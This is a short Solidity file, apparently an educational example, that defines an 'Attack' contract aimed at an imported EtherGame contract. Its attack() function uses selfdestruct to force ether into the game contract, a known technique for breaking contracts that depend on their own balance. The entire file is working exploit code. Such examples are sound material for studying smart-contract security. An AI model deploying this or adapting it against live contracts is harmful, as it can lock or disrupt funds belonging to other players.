// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {EtherGame} from "./EtherGame.sol";
contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function attack() public payable {
        // cast address to payable
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}
